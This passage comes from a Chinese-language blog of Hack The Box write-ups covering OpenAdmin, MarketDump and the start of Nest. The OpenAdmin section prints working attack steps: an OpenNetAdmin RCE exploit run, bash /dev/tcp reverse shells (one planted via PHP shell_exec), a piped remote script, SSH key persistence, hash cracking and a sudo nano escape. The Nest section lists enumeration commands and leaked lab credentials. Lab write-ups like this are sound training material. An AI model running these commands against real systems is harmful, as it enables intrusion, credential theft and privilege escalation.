data-srcset="https://assets.lxdlam.com/img/1647358168_61b5534e.png, https://assets.lxdlam.com/img/1647358168_61b5534e.png 1.5x, https://assets.lxdlam.com/img/1647358168_61b5534e.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647358168_61b5534e.png width=100%></a><p>是一个 default 页面，用 <code>gobuster</code> 爆一下。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir --url http://<span class=nv>$target</span>/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
</span></span></code></pre></td></tr></table></div></div><p>爆出来很多小网站，逐个试一下之后 <code>/music</code> 在这个站下面发现有用户相关系统：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647358431_e4d49fed.png title=https://assets.lxdlam.com/img/1647358431_e4d49fed.png data-thumbnail=https://assets.lxdlam.com/img/1647358431_e4d49fed.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647358431_e4d49fed.png data-srcset="https://assets.lxdlam.com/img/1647358431_e4d49fed.png, https://assets.lxdlam.com/img/1647358431_e4d49fed.png 1.5x, https://assets.lxdlam.com/img/1647358431_e4d49fed.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647358431_e4d49fed.png width=100%></a><p>点了下 <code>Login</code> 进到一个 <code>OpenNetAdmin</code> 的 Dashboard 里面，版本号是 <code>18.1.1</code>。</p><h3 id=foothold-1>Foothold</h3><p>搜了下 <code>OpenNetAdmin 18.1.1</code>，发现有 RCE，找到一个 poc：<a href=https://github.com/amriunix/ona-rce target=_blank rel="noopener noreffer">https://github.com/amriunix/ona-rce</a>，拉下来跑一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/amriunix/ona-rce<span class=p>;</span> <span class=nb>cd</span> ona-rce
</span></span><span class=line><span class=cl>python3 ona-rce.py check http://<span class=nv>$target</span>/ona
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647358974_613306e2.png title=https://assets.lxdlam.com/img/1647358974_613306e2.png data-thumbnail=https://assets.lxdlam.com/img/1647358974_613306e2.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647358974_613306e2.png data-srcset="https://assets.lxdlam.com/img/1647358974_613306e2.png, https://assets.lxdlam.com/img/1647358974_613306e2.png 1.5x, https://assets.lxdlam.com/img/1647358974_613306e2.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647358974_613306e2.png width=100%></a><p>直接拿 Reverse shell。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nc -lvnp <span class=m>1234</span>
</span></span><span class=line><span class=cl>python3 ona-rce.py exploit http://<span class=nv>$target</span>/ona
</span></span><span class=line><span class=cl>bash -c <span class=s1>&#39;bash -e &amp;&gt; /dev/tcp/&lt;ip&gt;/1234 &lt;&amp; 1&#39;</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647359161_2ec13b57.png title=https://assets.lxdlam.com/img/1647359161_2ec13b57.png data-thumbnail=https://assets.lxdlam.com/img/1647359161_2ec13b57.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647359161_2ec13b57.png data-srcset="https://assets.lxdlam.com/img/1647359161_2ec13b57.png, https://assets.lxdlam.com/img/1647359161_2ec13b57.png 1.5x, https://assets.lxdlam.com/img/1647359161_2ec13b57.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647359161_2ec13b57.png width=100%></a><h3 id=lateral-movement>Lateral Movement</h3><p>进来之后在 <code>/var/www</code> 里面逛一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ls -al /var/www
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647359709_b32b1793.png title=https://assets.lxdlam.com/img/1647359709_b32b1793.png data-thumbnail=https://assets.lxdlam.com/img/1647359709_b32b1793.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647359709_b32b1793.png data-srcset="https://assets.lxdlam.com/img/1647359709_b32b1793.png, https://assets.lxdlam.com/img/1647359709_b32b1793.png 1.5x, https://assets.lxdlam.com/img/1647359709_b32b1793.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647359709_b32b1793.png width=100%></a><p><code>html</code> 里面基本没啥用，<code>internal</code> 文件夹权限不足，继续在 <code>ona</code> 里面探索。审计了 <code>config/config.inc.php</code> 之后，发现真实的配置在 <code>local/config</code> 里面，进去审计 <code>database_settings.inc.php</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_type&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;mysqli&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_host&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;localhost&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_login&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;ona_sys&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_passwd&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;n1nj4W4rri0R!&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_database&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;ona_default&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_debug&#39;</span> <span class=o>=&gt;</span> <span class=k>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=p>),</span>
</span></span></code></pre></td></tr></table></div></div><p>用这个密码进 mysql 搜了一圈，没啥有用的，尝试拿这个密码用 jimmy 账号登一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh jimmy@<span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647359800_3a707ce3.png title=https://assets.lxdlam.com/img/1647359800_3a707ce3.png data-thumbnail=https://assets.lxdlam.com/img/1647359800_3a707ce3.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647359800_3a707ce3.png data-srcset="https://assets.lxdlam.com/img/1647359800_3a707ce3.png, https://assets.lxdlam.com/img/1647359800_3a707ce3.png 1.5x, https://assets.lxdlam.com/img/1647359800_3a707ce3.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647359800_3a707ce3.png width=100%></a><p>现在来看 <code>/var/www/internal</code>。审计 <code>index.php</code> 发现了一个硬编码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;jimmy&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>hash</span><span class=p>(</span><span class=s1>&#39;sha512&#39;</span><span class=p>,</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=o>==</span> <span class=s1>&#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>用 <code>john</code> 直接爆：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john <span class=nb>hash</span> --format<span class=o>=</span>Raw-SHA512 --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt --rules<span class=o>=</span>Jumbo
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647360236_2bedcce6.png title=https://assets.lxdlam.com/img/1647360236_2bedcce6.png data-thumbnail=https://assets.lxdlam.com/img/1647360236_2bedcce6.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647360236_2bedcce6.png data-srcset="https://assets.lxdlam.com/img/1647360236_2bedcce6.png, https://assets.lxdlam.com/img/1647360236_2bedcce6.png 1.5x, https://assets.lxdlam.com/img/1647360236_2bedcce6.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647360236_2bedcce6.png width=100%></a><p>审计 apache 配置：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /etc/apache2/sites-enabled/*.conf
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>Listen 127.0.0.1:52846
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;VirtualHost</span> <span class=err>127.0.0.1:52846</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    ServerName internal.openadmin.htb
</span></span><span class=line><span class=cl>    DocumentRoot /var/www/internal
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;IfModule</span> <span class=err>mpm_itk_module</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>AssignUserID joanna joanna
</span></span><span class=line><span class=cl><span class=nt>&lt;/IfModule&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    ErrorLog ${APACHE_LOG_DIR}/error.log
</span></span><span class=line><span class=cl>    CustomLog ${APACHE_LOG_DIR}/access.log combined
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/VirtualHost&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- snippets... --&gt;</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>注意，接下来的路径我跟官方 Walkthrough 的做法不同，官方 Walkthrough 是通过爆出来 joanna 的私钥密码来获取的 shell。</p></blockquote><p><code>internal</code> 路径下面的网站跑在 <code>52846</code> 端口上。进一步审计 <code>/var/www/internal</code> 发现 <code>index.php</code> 登陆之后访问 <code>main.php</code> 会跑一个 shell 命令。看了下 <code>main.php</code> 是可以改的，于是我们直接把 shell 命令换了，拿 Reverse shell。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># $output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$output</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s2>&#34;bash -c &#39;bash -e &amp;&gt; /dev/tcp/&lt;ip&gt;/1234 &lt;&amp; 1&#39;&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>然后直接用刚才拿到的用户名和密码请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># On local</span>
</span></span><span class=line><span class=cl>$ sudo nc -lvnp <span class=m>1234</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On remote</span>
</span></span><span class=line><span class=cl>$ curl -X POST http://127.0.0.1:52846/main.php -d <span class=s2>&#34;islogin=1&amp;username=jimmy&amp;password=Revealed&#34;</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647360919_035e36fe.png title=https://assets.lxdlam.com/img/1647360919_035e36fe.png data-thumbnail=https://assets.lxdlam.com/img/1647360919_035e36fe.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647360919_035e36fe.png data-srcset="https://assets.lxdlam.com/img/1647360919_035e36fe.png, https://assets.lxdlam.com/img/1647360919_035e36fe.png 1.5x, https://assets.lxdlam.com/img/1647360919_035e36fe.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647360919_035e36fe.png width=100%></a><p>成功拿到 user flag。</p><h3 id=privilege-escalation-1>Privilege Escalation</h3><p>跑一下 <a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS target=_blank rel="noopener noreffer">linpeas.sh</a>，看到一个很有意思的结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -L http://&lt;ip&gt;/linpeas.sh <span class=p>|</span> sh
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647361223_561805f8.png title=https://assets.lxdlam.com/img/1647361223_561805f8.png data-thumbnail=https://assets.lxdlam.com/img/1647361223_561805f8.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647361223_561805f8.png data-srcset="https://assets.lxdlam.com/img/1647361223_561805f8.png, https://assets.lxdlam.com/img/1647361223_561805f8.png 1.5x, https://assets.lxdlam.com/img/1647361223_561805f8.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647361223_561805f8.png width=100%></a><p>有 suid 提权空间。</p><p>尝试拿到一个正规 shell。生成一个新的 ssh 私钥然后把公钥写进 <code>/home/joanna/.ssh/authorized_keys</code> 里面：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># On local</span>
</span></span><span class=line><span class=cl>$ ssh-keygen -C joanna@openadmin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On remote</span>
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;&lt;pubkey&gt;&#39;</span> &gt;&gt; /home/joanna/.ssh/authorized_keys
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On local</span>
</span></span><span class=line><span class=cl>$ ssh joanna@<span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><p>然后根据 <a href=https://gtfobins.github.io/gtfobins/nano/ target=_blank rel="noopener noreffer">GTFOBins</a> 的教程，直接跑提权即可：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo nano /opt/priv
</span></span><span class=line><span class=cl>^R^X
</span></span><span class=line><span class=cl>reset<span class=p>;</span> sh 1&gt;<span class=p>&amp;</span><span class=m>0</span> 2&gt;<span class=p>&amp;</span><span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647361932_d8e00f1a.png title=https://assets.lxdlam.com/img/1647361932_d8e00f1a.png data-thumbnail=https://assets.lxdlam.com/img/1647361932_d8e00f1a.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647361932_d8e00f1a.png data-srcset="https://assets.lxdlam.com/img/1647361932_d8e00f1a.png, https://assets.lxdlam.com/img/1647361932_d8e00f1a.png 1.5x, https://assets.lxdlam.com/img/1647361932_d8e00f1a.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647361932_d8e00f1a.png width=100%></a><p>成功提权并拿到 root flag。</p><h2 id=marketdump>MarketDump</h2><p>下载下来是一个 <code>.pcapng</code> 的包 dump，开 WireShark 看一眼。从上往下顺着翻一下，看到有很多 telnet 和 tcp，直接 follow tcp stream，发现下面有一堆卡号，这个应该就是攻击者想要的 payload。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647351169_1bfd3fb7.png title=https://assets.lxdlam.com/img/1647351169_1bfd3fb7.png data-thumbnail=https://assets.lxdlam.com/img/1647351169_1bfd3fb7.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647351169_1bfd3fb7.png data-srcset="https://assets.lxdlam.com/img/1647351169_1bfd3fb7.png, https://assets.lxdlam.com/img/1647351169_1bfd3fb7.png 1.5x, https://assets.lxdlam.com/img/1647351169_1bfd3fb7.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647351169_1bfd3fb7.png width=100%></a><p>把这堆卡号拉出来，看看有没有什么有意思的信息混在里面。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>grep -vE <span class=s1>&#39;American Express,[0-9]{15}&#39;</span> payload.txt
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647351693_b82a565a.png title=https://assets.lxdlam.com/img/1647351693_b82a565a.png data-thumbnail=https://assets.lxdlam.com/img/1647351693_b82a565a.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647351693_b82a565a.png data-srcset="https://assets.lxdlam.com/img/1647351693_b82a565a.png, https://assets.lxdlam.com/img/1647351693_b82a565a.png 1.5x, https://assets.lxdlam.com/img/1647351693_b82a565a.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647351693_b82a565a.png width=100%></a><p>发现一个显然不是卡号的东西，拉到 <a href=https://gchq.github.io/CyberChef/ target=_blank rel="noopener noreffer">CyberChef</a> 上看看。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647351786_f40b9ffd.png title=https://assets.lxdlam.com/img/1647351786_f40b9ffd.png data-thumbnail=https://assets.lxdlam.com/img/1647351786_f40b9ffd.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647351786_f40b9ffd.png data-srcset="https://assets.lxdlam.com/img/1647351786_f40b9ffd.png, https://assets.lxdlam.com/img/1647351786_f40b9ffd.png 1.5x, https://assets.lxdlam.com/img/1647351786_f40b9ffd.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647351786_f40b9ffd.png width=100%></a><p>成功拿到 flag。</p><h2 id=nest>Nest</h2><h3 id=enumeration-2>Enumeration</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>ports</span><span class=o>=</span><span class=k>$(</span>nmap -p- --min-rate<span class=o>=</span><span class=m>1000</span> -T4 -Pn <span class=nv>$target</span> <span class=p>|</span> grep ^<span class=o>[</span>0-9<span class=o>]</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f <span class=m>1</span> <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed s/,$//<span class=k>)</span>
</span></span><span class=line><span class=cl>nmap -p <span class=nv>$ports</span> -sCV -Pn <span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647366417_db5f7be0.png title=https://assets.lxdlam.com/img/1647366417_db5f7be0.png data-thumbnail=https://assets.lxdlam.com/img/1647366417_db5f7be0.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647366417_db5f7be0.png data-srcset="https://assets.lxdlam.com/img/1647366417_db5f7be0.png, https://assets.lxdlam.com/img/1647366417_db5f7be0.png 1.5x, https://assets.lxdlam.com/img/1647366417_db5f7be0.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647366417_db5f7be0.png width=100%></a><p>有一个 smb 服务，另一个看上去是一个 telnet 服务。</p><p><code>smbmap</code> 枚举一波：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbmap -H <span class=nv>$target</span> -u guest -p <span class=s1>&#39;&#39;</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647366750_c6351cd4.png title=https://assets.lxdlam.com/img/1647366750_c6351cd4.png data-thumbnail=https://assets.lxdlam.com/img/1647366750_c6351cd4.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647366750_c6351cd4.png data-srcset="https://assets.lxdlam.com/img/1647366750_c6351cd4.png, https://assets.lxdlam.com/img/1647366750_c6351cd4.png 1.5x, https://assets.lxdlam.com/img/1647366750_c6351cd4.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647366750_c6351cd4.png width=100%></a><p>分别枚举一下两个可读的文件夹，在 <code>Data/Shared/Tempaltes/HR/Welcome Email.txt</code> 里面发现一组账号密码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>Username: TempUser
</span></span><span class=line><span class=cl>Password: welcome2019
</span></span></code></pre></td></tr></table></div></div><p>用这组 credential 重新枚举一遍，在 <code>Data/IT</code> 里面发现了很多文本文件，拉下来挨个看一眼：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbmap -H <span class=nv>$target</span> -u tempuser -p welcome2019 -R Data -A xml
</span></span><span class=line><span class=cl>smbmap -H <span class=nv>$target</span> -u tempuser -p welcome2019 -R Data -A txt
</span></span><span class=line><span class=cl>grep -ir password *.txt *.xml
</span></span></code></pre></td></tr></table></div></div><p>在 <code>Data/IT/Configs/RU Scanner/RU_config.xml</code> 里找到一个密码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class=nt>&lt;/Password&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>拉到 <a href=https://gchq.github.io/CyberChef/ target=_blank rel="noopener noreffer">CyberChef</a> 上，发现是 base64 编码，但是解码之后没什么意义，应该是二进制数据。继续研究这一堆 xml，在 <code>Data/IT/Configs/NotePadPlusPlus/config.xml</code> 里面发现了一个有意思的文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;File</span> <span class=na>filename=</span><span class=s>&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34;</span> <span class=nt>/&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>枚举一下这个文件夹：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbmap -H <span class=nv>$target</span> -u tempuser -p welcome2019 -R <span class=s1>&#39;Secure$\IT\Carl&#39;</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647367475_c836a79b.png title=https://assets.lxdlam.com/img/1647367475_c836a79b.png data-thumbnail=https://assets.lxdlam.com/img/1647367475_c836a79b.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647367475_c836a79b.png data-srcset="https://assets.lxdlam.com/img/1647367475_c836a79b.png, https://assets.lxdlam.com/img/1647367475_c836a79b.png 1.5x, https://assets.lxdlam.com/img/1647367475_c836a79b.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647367475_c836a79b.png width=100%></a><p>发现这个项目跟上面的配置文件有关。挂载起来看一眼：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo mount -t cifs -o ro,username<span class=o>=</span>tempuser,password<span class=o>=</span>welcome2019 <span class=s2>&#34;//</span><span class=nv>$target</span><span class=s2>/Secure\$/IT/Carl&#34;</span> /mnt/carl
</span></span><span class=line><span class=cl><span class=nb>cd</span> /mnt/carl
</span></span></code></pre></td></tr></table></div></div><p>审计了一下 <code>Utils.vb</code>，里面的核心函数如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-vb data-lang=vb><span class=line><span class=cl><span class=c>&#39; code snippets...
